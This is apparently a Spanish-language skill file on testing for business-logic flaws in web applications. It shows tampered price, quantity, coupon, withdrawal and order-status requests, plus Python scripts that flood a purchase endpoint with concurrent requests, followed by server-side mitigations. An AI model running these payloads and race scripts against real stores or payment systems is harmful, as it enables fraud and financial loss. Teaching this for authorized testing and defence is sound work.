---
name: business-logic-testing
description: Habilidades profesionales y metodología para pruebas de vulnerabilidades de lógica de negocio
version: 1.0.0
---

# Pruebas de vulnerabilidades de lógica de negocio

## Descripción general

Las vulnerabilidades de lógica de negocio son defectos de diseño en el flujo de procesamiento de la aplicación, que pueden resultar en operaciones no autorizadas, manipulación de datos, pérdida de fondos, etc. Esta habilidad proporciona métodos para la detección, explotación y protección contra vulnerabilidades de lógica de negocio.

## Tipos de vulnerabilidades

### 1. Evasión de flujo de trabajo

**Omitir pasos de validación:**
- Acceder directamente al paso final
- Modificar el orden de los pasos
- Ejecutar pasos repetidamente

### 2. Manipulación de precios

**Precios negativos:**
- Ingresar montos negativos
- Resulta en un aumento del saldo de la cuenta

**Alteración de precios:**
- Modificar el precio en el frontend
- Modificar el precio en la solicitud de la API

### 3. Evasión de límites de cantidad

**Cantidades negativas:**
- Ingresar números negativos
- Puede resultar en un aumento del inventario

**Exceder límites:**
- Modificar el límite de cantidad
- Evasión mediante operaciones por lotes

### 4. Condiciones de carrera (tiempo)

**Solicitudes concurrentes:**
- Enviar múltiples solicitudes simultáneamente
- Evadir el límite de una sola vez

### 5. Manipulación de estado

**Reversión de estado:**
- Cambiar un pedido completado a pendiente de pago
- Modificar el estado del pedido

## Métodos de prueba

### 1. Análisis de flujo de trabajo

**Identificar procesos de negocio:**
- Proceso de registro
- Proceso de compra
- Proceso de retiro
- Proceso de revisión

**Prueba de omisión de pasos:**
```
Proceso normal: Paso 1 → Paso 2 → Paso 3
Prueba: Acceder directamente al Paso 3
Prueba: Paso 1 → Paso 3 (omitir Paso 2)
```

### 2. Manipulación de parámetros

**Modificar parámetros clave:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # Modificar a 0.01
}
```

**Prueba de números negativos:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. Pruebas de concurrencia

**Enviar solicitudes simultáneamente:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase', 
                  json={'product_id': 123, 'quantity': 1})

# Enviar 10 solicitudes simultáneamente
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. Modificación de estado

**Modificar el estado del pedido:**
```http
PATCH /api/order/123
{
  "status": "completed"  # Modificar a completado
}
```

**Revertir estado:**
```http
PATCH /api/order/123
{
  "status": "pending"  # Revertir de completado a pendiente de pago
}
```

## Técnicas de explotación

### Manipulación de precios

**Precios negativos:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Modificar precio en el frontend:**
```javascript
// Código frontend
const price = 100.00;

// Modificar a
const price = 0.01;
```

**Modificación de precio en la API:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # Precio original 100.00
      "quantity": 1
    }
  ]
}
```

### Evasión de límites de cantidad

**Cantidades negativas:**
```json
{
  "product_id": 123,
  "quantity": -10  # Puede resultar en un aumento del inventario
}
```

**Exceder límites:**
```json
{
  "product_id": 123,
  "quantity": 999999  # Excede el límite de compra única
}
```

### Abuso de cupones

**Uso repetido:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# Usar repetidamente el mismo cupón
```

**Cupones no activados:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # Usar cupón caducado
  "items": [...]
}
```

### Vulnerabilidades de retiro

**Retiros negativos:**
```json
{
  "amount": -1000.00  # Puede resultar en un aumento del saldo de la cuenta
}
```

**Exceder el saldo:**
```json
{
  "amount": 999999.00  # Excede el saldo de la cuenta
}
```

### Condiciones de carrera (tiempo)

**Compras concurrentes:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Venta flash, solicitudes concurrentes
for i in range(100):
    threading.Thread(target=buy).start()
```

## Técnicas de evasión

### Evasión de validación del frontend

**Llamar directamente a la API:**
- Evadir la validación de JavaScript en el frontend
- Enviar la solicitud de la API directamente

**Modificar la solicitud:**
- Usar Burp Suite para interceptar
- Modificar los parámetros antes de enviar

### Análisis de códigos de estado

**Observar la respuesta:**
- 200 OK - Posible éxito
- 400 Bad Request - Error de parámetro
- 403 Forbidden - Permisos insuficientes
- 500 Internal Server Error - Error del servidor

### Explotación de mensajes de error

**Obtener información de los mensajes de error:**
```
Error: "Saldo insuficiente, saldo actual: 100.00"
→ Se puede obtener información del saldo de la cuenta
```

## Uso de herramientas

### Burp Suite

**Uso de Repeater:**
1. Interceptar la solicitud de negocio
2. Modificar parámetros clave
3. Observar la respuesta

**Uso de Intruder:**
1. Marcar parámetros
2. Usar lista de payloads
3. Pruebas por lotes

### Scripts personalizados

```python
import requests
import json

def test_price_manipulation():
    # Prueba de modificación de precios
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Validación y reportes

### Pasos de validación

1. Confirmar que se pueden evadir las restricciones de la lógica de negocio
2. Validar que se pueden ejecutar operaciones no autorizadas
3. Evaluar el impacto (pérdida de fondos, manipulación de datos, etc.)
4. Registrar la prueba de concepto (PoC) completa

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y proceso de negocio
- Operaciones no autorizadas ejecutables
- Pasos completos de explotación y PoC
- Recomendaciones de mitigación (validación en el servidor, verificación de reglas de negocio, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Validación en el servidor**
   ```python
   def process_purchase(product_id, quantity, price):
       # Obtener el precio real de la base de datos
       real_price = db.get_product_price(product_id)
       
       # Validar el precio
       if price != real_price:
           raise ValueError("Price mismatch")
       
       # Validar la cantidad
       if quantity <= 0:
           raise ValueError("Invalid quantity")
       
       # Procesar la compra
       process_order(product_id, quantity, real_price)
   ```

2. **Validación de máquina de estados**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"
       
       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }
       
       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Control de concurrencia**
   ```python
   import threading
   
   lock = threading.Lock()
   
   def process_order(order_id):
       with lock:
           # Verificar el estado del pedido
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")
           
           # Procesar el pedido
           process(order)
   ```

4. **Validación de reglas de negocio**
   ```python
   def validate_business_rules(order):
       # Validar límite de cantidad
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")
       
       # Validar rango de precios
       if order.price <= 0:
           raise ValueError("Invalid price")
       
       # Validar inventario
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Registros de auditoría**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Consideraciones

- Realizar pruebas únicamente en entornos autorizados
- Evitar causar un impacto real en el negocio
- Prestar atención a las diferencias en los distintos procesos de negocio
- Asegurar la consistencia de los datos durante las pruebas